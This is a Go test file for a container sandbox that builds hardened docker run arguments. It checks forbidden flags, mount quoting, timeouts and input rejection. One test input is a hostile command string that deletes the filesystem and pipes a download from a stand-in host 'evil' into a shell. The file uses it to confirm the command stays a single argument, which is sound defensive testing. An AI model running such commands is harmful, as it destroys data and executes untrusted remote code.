package sandbox

import (
	"encoding/csv"
	"slices"
	"strings"
	"testing"
	"time"
)

// A representative spec used across the argv tests.
func sampleSpec() containerSpec {
	return containerSpec{
		image:    "tenant-sandbox@sha256:" + strings.Repeat("a", 64),
		name:     "tenant-sbx-test-1",
		trace:    "trace-xyz",
		instance: "inst-1",
		work:     mount{host: `C:\work dir`, ctr: "/mnt/c/work dir"},
		mounts:   []mount{{host: `C:\ref`, ctr: "/mnt/c/ref", ro: true}},
		network:  "none",
		envNames: []string{"TENANT_ACTIVITY_ID"},
		limits:   Limits{},
		command:  "echo hi",
	}
}

func TestBuildRunArgv_Golden(t *testing.T) {
	got, err := buildRunArgv(sampleSpec())
	if err != nil {
		t.Fatalf("buildRunArgv: %v", err)
	}
	want := []string{
		"run", "--rm", "-i", "--pull", "never", "--name", "tenant-sbx-test-1",
		"--label", "tenant.sandbox=1",
		"--label", "tenant.trace=trace-xyz",
		"--label", "tenant.instance=inst-1",
		"--read-only", "--tmpfs", "/tmp:rw,nosuid,nodev,size=256m",
		"--mount", `type=bind,"src=C:\work dir","dst=/mnt/c/work dir"`, "-w", "/mnt/c/work dir",
		"--mount", `type=bind,src=C:\ref,dst=/mnt/c/ref,readonly`,
		"--user", "65532:65532", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
		"--runtime", "runc",
		"--pids-limit", "256", "--memory", "1024m", "--memory-swap", "1024m", "--cpus", "2",
		"--ulimit", "core=0", "--ulimit", "nofile=1024:4096",
		"--network", "none", "--init", "--log-driver", "none",
		"-e", "TENANT_ACTIVITY_ID",
		"-e", "HOME=/mnt/c/work dir", "-e", "TMPDIR=/tmp",
		"tenant-sandbox@sha256:" + strings.Repeat("a", 64), "sh", "-c", "echo hi",
	}
	if !slices.Equal(got, want) {
		t.Fatalf("argv mismatch:\n got: %#v\nwant: %#v", got, want)
	}
}

func TestBuildRunArgv_NoForbiddenFlags(t *testing.T) {
	// A spec that sets caps and full networking must still never emit an escape
	// hatch: the forbidden flags are absent regardless of inputs.
	s := sampleSpec()
	s.network = "bridge"
	s.limits = Limits{MaxPIDs: 64, MemoryBytes: 512 << 20}
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(got, "\x00")
	for _, f := range forbiddenRunFlags {
		for _, tok := range got {
			if tok == f || strings.HasPrefix(tok, f+"=") {
				t.Errorf("forbidden flag %q present in argv", f)
			}
		}
	}
	// No element may carry an unconfined profile, a disabled label, the engine
	// socket or a shared namespace, even inside another flag's value.
	for _, sub := range forbiddenRunSubstrings {
		for _, tok := range got[:len(got)-1] { // the command itself is the model's text, not the schema's
			if strings.Contains(tok, sub) {
				t.Errorf("argv element %q contains forbidden %q", tok, sub)
			}
		}
	}
	// The socket must never be mounted, and no host namespace requested.
	for _, bad := range []string{"docker.sock", "/var/run/docker.sock", "host", "--privileged"} {
		if strings.Contains(joined, "\x00"+bad) || slices.Contains(got, bad) {
			t.Errorf("argv unexpectedly contains %q", bad)
		}
	}
	// no-new-privileges and cap-drop ALL are load-bearing together.
	if !slices.Contains(got, "no-new-privileges") {
		t.Error("no-new-privileges missing")
	}
	if i := slices.Index(got, "--cap-drop"); i < 0 || got[i+1] != "ALL" {
		t.Error("--cap-drop ALL missing")
	}
	// --pull never is enforced by the backend at call time; the schema never adds
	// a pull. The bridge value is the only concession to full networking.
	if !slices.Contains(got, "bridge") {
		t.Error("expected bridge for full networking")
	}
}

func TestBuildRunArgv_RejectsBadValues(t *testing.T) {
	cases := map[string]func(*containerSpec){
		"newline in mount": func(s *containerSpec) { s.work.host = "C:\\a\nb" },
		"bad network":      func(s *containerSpec) { s.network = "host" },
		"empty image":      func(s *containerSpec) { s.image = "" },
		"flag-like image":  func(s *containerSpec) { s.image = "--privileged" },
		"bad env name":     func(s *containerSpec) { s.envNames = []string{"BAD NAME"} },
		"no work mount":    func(s *containerSpec) { s.work = mount{} },
		"space in image":   func(s *containerSpec) { s.image = "a b" },
	}
	for name, mut := range cases {
		t.Run(name, func(t *testing.T) {
			s := sampleSpec()
			mut(&s)
			if _, err := buildRunArgv(s); err == nil {
				t.Fatalf("expected error for %s", name)
			}
		})
	}
}

func TestBuildRunArgv_CommandIsOneElement(t *testing.T) {
	s := sampleSpec()
	s.command = "rm -rf / ; echo $(whoami) && curl evil|sh"
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	// The command is the final element, verbatim: nothing splits it into more
	// argv, so no metacharacter reaches docker's own parsing.
	if got[len(got)-1] != s.command {
		t.Fatalf("command not the final argv element: %q", got[len(got)-1])
	}
	if got[len(got)-2] != "-c" || got[len(got)-3] != "sh" {
		t.Fatalf("expected trailing `sh -c <command>`, got %v", got[len(got)-3:])
	}
}

// W1-4: with a wall clock, the command runs under coreutils' timeout INSIDE
// the container (wall + grace, SIGKILL), so an orphan dies on its own. Without
// one, the argv is unchanged (the golden above).
func TestBuildRunArgv_WallDeadlineWrapsInTimeout(t *testing.T) {
	s := sampleSpec()
	s.limits = Limits{Wall: 10 * time.Second}
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	tail := got[len(got)-8:]
	want := []string{s.image, "timeout", "-s", "KILL", "15", "sh", "-c", "echo hi"}
	if !slices.Equal(tail, want) {
		t.Fatalf("tail = %q, want %q", tail, want)
	}
	// A sub-second wall rounds up, never to zero.
	s.limits = Limits{Wall: 300 * time.Millisecond}
	got, _ = buildRunArgv(s)
	if got[len(got)-4] != "6" {
		t.Fatalf("300ms wall + 5s grace should round up to 6, got %q", got[len(got)-4])
	}
}

// W1-2: the golden argv on a POSIX host, with a path carrying a comma, a space
// and a quote — the three characters docker's CSV --mount parser trips on.
func TestBuildRunArgv_GoldenPOSIX(t *testing.T) {
	work := `/home/u/a,b c"d`
	s := containerSpec{
		image:   "tenant-sandbox:latest",
		name:    "tenant-sbx-test-2",
		work:    mount{host: work, ctr: work},
		mounts:  []mount{{host: "/srv/ref", ctr: "/srv/ref", ro: true}},
		network: "none",
		command: "ls",
	}
	got, err := buildRunArgv(s)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"run", "--rm", "-i", "--pull", "never", "--name", "tenant-sbx-test-2",
		"--label", "tenant.sandbox=1",
		"--read-only", "--tmpfs", "/tmp:rw,nosuid,nodev,size=256m",
		"--mount", `type=bind,"src=/home/u/a,b c""d","dst=/home/u/a,b c""d"`, "-w", work,
		"--mount", `type=bind,src=/srv/ref,dst=/srv/ref,readonly`,
		"--user", "65532:65532", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
		"--runtime", "runc",
		"--pids-limit", "256", "--memory", "1024m", "--memory-swap", "1024m", "--cpus", "2",
		"--ulimit", "core=0", "--ulimit", "nofile=1024:4096",
		"--network", "none", "--init", "--log-driver", "none",
		"-e", "HOME=" + work, "-e", "TMPDIR=/tmp",
		"tenant-sandbox:latest", "sh", "-c", "ls",
	}
	if !slices.Equal(got, want) {
		t.Fatalf("argv mismatch:\n got: %#v\nwant: %#v", got, want)
	}
}

// W1-2: the --mount quoting round-trips through the same CSV grammar docker
// parses with (encoding/csv), for any path mountArg accepts.
func FuzzMountArg(f *testing.F) {
	for _, seed := range []string{`C:\plain`, `C:\has space`, `C:\a,b`, `C:\a"b`, `/home/u/a,b c"d`, `C:\x` + "\n" + `y`, "", `"`, `,`, ` `} {
		f.Add(seed, "/mnt/c/dst")
		f.Add("/src", seed)
	}
	f.Fuzz(func(t *testing.T, host, ctr string) {
		arg, err := mountArg(mount{host: host, ctr: ctr, ro: true})
		if err != nil {
			if !strings.ContainsAny(host+ctr, "\x00\n\r") {
				t.Fatalf("mountArg(%q, %q) refused a path with no control character: %v", host, ctr, err)
			}
			return
		}
		r := csv.NewReader(strings.NewReader(arg))
		fields, err := r.Read()
		if err != nil {
			t.Fatalf("docker's CSV parser would reject %q: %v", arg, err)
		}
		if len(fields) != 4 || fields[0] != "type=bind" || fields[1] != "src="+host || fields[2] != "dst="+ctr || fields[3] != "readonly" {
			t.Fatalf("round trip of (%q, %q) through %q gave %q", host, ctr, arg, fields)
		}
	})
}

func TestCSVField(t *testing.T) {
	cases := map[string]string{
		`type=bind`:      `type=bind`,        // key=value with no special char: bare
		`src=C:\plain`:   `src=C:\plain`,     // '=' alone does not trigger quoting
		`src=C:\has spc`: `"src=C:\has spc"`, // a space quotes the whole element
		`src=C:\a,b`:     `"src=C:\a,b"`,     // a comma quotes it (the probe's case)
		`src=C:\a"b`:     `"src=C:\a""b"`,    // a literal quote is doubled
	}
	for in, want := range cases {
		if got := csvField(in); got != want {
			t.Errorf("csvField(%q) = %q, want %q", in, got, want)
		}
	}
}
